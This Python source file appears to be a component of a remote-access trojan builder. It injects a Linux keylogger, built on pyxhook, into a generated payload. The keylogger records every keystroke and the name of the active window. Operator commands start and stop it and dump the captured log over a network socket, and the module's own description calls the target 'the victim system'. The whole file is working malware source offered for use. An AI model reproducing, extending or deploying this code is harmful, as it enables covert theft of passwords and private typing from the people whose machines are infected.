# WEB + COM
# done
import library.modules.config as config
config.main()
interface = config.interface
if interface == "GUI":
    from flask import jsonify


def main(option):
    if option == 'generate':
        config.import_statements.append('import pyxhook')
        config.import_statements.append('import threading')
        config.import_statements.append('from time import sleep')
        config.global_objs.append('keylog = ""')
        config.global_objs.append('window = ""')
        config.global_objs.append('active_logger = False')
        config.functions.append('''
def OnKeyboardEvent(event):
    global window
    global keylog
    sample_space = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890'
    try:
        letter = event.Key
        if event.WindowName != window:
            keylog += '\\n\\n<User started typing in new window : ' + event.WindowName + '>\\n\\n'
            window = event.WindowName
        if letter not in sample_space:
            keylog += '[' + letter + ']'
        else:
            keylog += letter
    except:
        keylog += '[Error Logging Key!]'
    return True

def key(option):
    global active_logger
    global keylog
    if option == 'key_start':
        if active_logger:
            s.sendall('[-]Keylogger already started'.encode())
        else:
            hooks_manager = pyxhook.HookManager()
            hooks_manager.KeyDown = OnKeyboardEvent
            hooks_manager.HookKeyboard()
            hooks_manager.start()
            active_logger = not active_logger
            s.sendall('[+]Activated keylogger'.encode())
            while True:
                if not active_logger:
                    hooks_manager.cancel()
                    return
                else:
                    sleep(1)
    elif option == 'key_stop':
        if not active_logger:
            s.sendall('[-]Keylogger not started'.encode())
        else:
            active_logger = not active_logger
            s.sendall('[+]Stopped keylogger'.encode())
    elif option == 'key_dump':
        s.sendall(('[+]Keylog dump : \\n' + keylog + '\\n').encode())
        keylog = ""''')
        config.logics.append('''
            elif command in ('key_start','key_stop','key_dump'):
                t = threading.Thread(target=key, args=(data,))
                t.start()''')
        config.help_menu['key_start'] = 'Start the keylogger'
        config.help_menu['key_stop'] = 'Stop the keylogger'
        config.help_menu['key_dump'] = 'Dump the captured in-memory keystrokes'
    elif option == 'info':
        if interface == "GUI":
            return {
                "Name": "Keylogger and window logger component",
                "OS": "Linux",
                "Required Modules": "pyxhook (External)",
                "Commands": "key_start, key_stop, key_dump",
                "Description": "Runs a keylogger on the victim system which logs in-memory also logs which windows it is captured in, to view the log run the key_dump command"
            }
        elif interface == "CUI":
            print('\nName             : Keylogger and window logger component' \
                  '\nOS               : Linux' \
                  '\nRequired Modules : pyxhook (External)' \
                  '\nCommands         : key_start, key_stop, key_dump' \
                  '\nDescription      : Runs a keylogger on the victim system which logs in-memory also logs which windows it is captured in, to view the log run the key_dump command\n')
